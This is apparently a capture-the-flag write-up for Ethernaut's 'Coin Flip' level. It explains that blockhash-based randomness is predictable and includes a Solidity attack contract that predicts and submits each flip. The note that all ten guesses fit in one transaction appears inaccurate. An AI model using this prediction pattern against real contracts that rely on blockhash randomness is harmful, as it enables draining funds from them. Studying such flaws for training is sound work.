# Ethernaut Level 3: Coin Flip

## Objective
Guess the correct outcome 10 times in a row.

## Vulnerability
Using blockchain data for "randomness" is predictable:
```solidity
uint256 blockValue = uint256(blockhash(block.number - 1));
uint256 coinFlip = blockValue / FACTOR;
bool side = coinFlip == 1 ? true : false;
```

Anyone can compute the same blockhash and predict the outcome.

## Exploit Strategy
1. Compute the same hash as the contract
2. Call `flip()` with the predicted outcome
3. Repeat 10 times (can be done in single transaction via loop)

## Execution
```bash
python3 exploit.py
```

## Key Learnings
- Blockhash is NOT random - it's deterministic
- On-chain randomness requires oracles (Chainlink VRF)
- All blockchain state is visible before transaction executes

## Attack Contract Pattern
```solidity
contract CoinFlipAttack {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
    function attack(address _target) public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        bool guess = (blockValue / FACTOR) == 1;
        CoinFlip(_target).flip(guess);
    }
}
```
